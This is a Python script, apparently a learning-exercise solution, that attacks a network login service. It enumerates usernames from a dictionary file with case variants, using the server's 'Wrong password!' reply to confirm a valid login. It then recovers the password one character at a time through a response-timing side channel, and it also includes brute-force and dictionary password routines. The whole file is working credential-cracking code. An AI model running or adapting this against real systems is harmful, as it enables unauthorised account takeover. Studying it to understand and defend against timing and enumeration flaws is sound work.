from itertools import product
import socket
import sys
import string
import json
from time import time


def password_generator(length=1000000) -> str:
    possible_symbols = string.ascii_letters + string.digits
    for i in range(length):
        for message in product(possible_symbols, repeat=i+1):
            yield "".join(message)


def brute_force():  # client_socket
    generator = password_generator()
    for message in generator:
        password = ''.join(message)
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            print(password)
            break


def case_generator(_password) -> str:
    if not _password.isdigit():
        all_spelling_options = map(lambda x: ''.join(x),
                                   product(*([letter.lower(), letter.upper()] for letter in _password)))
        for i in all_spelling_options:
            yield i
    else:
        yield _password


def send_and_recv_json_request(message) -> str:
    client_socket.send(message.encode())
    return client_socket.recv(1024).decode()


def try_dictionary_password(_dict_file, _client_socket):
    password_pool = tuple(open(_dict_file).read().split('\n'))
    for password in password_pool:
        for password_variant in case_generator(password):
            response = send_and_recv_json_request(password_variant)
            if response == "Connection success!":
                print(password_variant)
                exit()


def hack_login(_dict_file):
    # find login first, then find password, then send request
    logins_pool = [login for login in tuple(open(_dict_file).read().split('\n')) if login]
    # iterating throug the loggins pool
    for login in logins_pool:
        # defining case-generator
        generator_logins = case_generator(login)
        # trying options from generator
        for login_variant in generator_logins:
            # creating json message to the server
            message = {"login": login_variant, "password": ""}
            # sending json message to the server and
            # reading response from server
            response = send_and_recv_json_request(json.dumps(message))
            # "Wrong login!" should be ignored. once "Wrong password!" message received = login hacked,
            # and need to find the password.
            if json.loads(response)["result"] == "Wrong password!":
                # login_variant will be correct login at this step
                return login_variant


def hack_password(login, password_beginning=""):
    for password in password_generator(length=1):
        if password_beginning:
            password = password_beginning + password
        message = {"login": login, "password": password}
        # reading response from server
        start = time()
        response = send_and_recv_json_request(json.dumps(message))
        end = time()
        processing_time = (end - start) * 10_000_000
        logs.write(f"result :{json.loads(response)['result']}  {processing_time}\n")

        if json.loads(response)["result"] == "Wrong password!" and processing_time > 90000:
            return hack_password(login, password_beginning=password)
        if json.loads(response)["result"] == "Connection success!":
            print(json.dumps(message))
            exit()


logs = open("logs.txt", "a")


def main(logs):
    args = sys.argv
    if len(args) < 3:
        print("Not enough arguments. Please provide : ip_address, port, message")
        exit()
    ip_address = args[1]
    port = int(args[2])
    global client_socket
    client_socket = socket.socket()
    client_socket.connect((ip_address, port))  # connect takes the tuple as an argument
    dictionary_file = "hacking/logins.txt"
    login = hack_login(dictionary_file)
    if not login:
        print("sorry, no more logins in DB file")
    else:
        hack_password(login)

    client_socket.close()  # close connection
    logs.close()


if __name__ == '__main__':
    client_socket = ''
    main(logs)

# (final - start).microseconds >= 90000
